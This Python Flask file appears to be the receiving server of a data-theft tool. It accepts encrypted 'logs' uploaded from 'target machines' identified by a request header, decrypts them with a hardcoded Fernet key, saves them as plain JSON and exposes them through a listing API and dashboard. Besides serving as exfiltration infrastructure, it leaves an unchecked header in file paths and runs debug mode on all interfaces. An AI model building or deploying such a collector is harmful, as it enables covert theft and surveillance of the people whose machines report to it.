from flask import Flask, render_template, request, jsonify
import os
import json
from cryptography.fernet import Fernet

app = Flask("__main__")
key = b'9YxKn3m3G5qXz2o9xYxKn3m3G5qXz2o9xYxKn3m3G5q='
fernet = Fernet(key)

DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
DECRYPTED_FOLDER = os.path.join(os.path.dirname(__file__), "decrypted_data")
data_list = []


@app.route("/")
def home():
    return render_template("home.html")


@app.route("/api/getTargetMachinesList", methods=["GET"])
def get_target_machines_list():
    all_machines = os.listdir(DATA_FOLDER)
    return jsonify(all_machines), 200


@app.route("/api/getData/<machine>", methods=["GET"])
def get_data(machine):
    machine_path = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_path):
        return jsonify({"error": "Machine not found"}), 404

    data_objects = {}
    for file_name in os.listdir(machine_path):
        file_path = os.path.join(machine_path, file_name)
        with open(file_path, "rb") as file:
            try:
                encrypted_data = file.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                data_objects[f"{file_name.strip('.enc')}"] = json.loads(decrypted_data)
            except (json.JSONDecodeError, Exception):
                data_objects[f"{file_name.strip('.enc')}"] = {
                    "error": f"{file_name} is not valid JSON or decryption failed"}
    return jsonify(data_objects), 200


@app.route("/api/upload", methods=["POST"])
def upload_api():
    data = request.get_data()
    if not data:
        return jsonify({"error": "Invalid payload"}), 400

    machine_name = request.headers.get("X-Machine-Name", "unknown")
    machine_path = os.path.join(DATA_FOLDER, machine_name)
    decrypted_machine_path = os.path.join(DECRYPTED_FOLDER, machine_name)
    os.makedirs(machine_path, exist_ok=True)
    os.makedirs(decrypted_machine_path, exist_ok=True)

    file_name = f"log_{len(os.listdir(machine_path)) + 1}.enc"
    file_path = os.path.join(machine_path, file_name)

    with open(file_path, "wb") as f:
        f.write(data)

    try:
        decrypted_data = fernet.decrypt(data)
        decrypted_json = json.loads(decrypted_data)
        data_list.append(decrypted_json)

        decrypted_file_name = f"log_{len(os.listdir(decrypted_machine_path)) + 1}.json"
        decrypted_file_path = os.path.join(decrypted_machine_path, decrypted_file_name)
        with open(decrypted_file_path, "w", encoding="utf-8") as f:
            json.dump(decrypted_json, f, indent=2, ensure_ascii=False)

        return jsonify({"status": "success"}), 200
    except Exception:
        return jsonify({"error": "Decryption failed"}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)
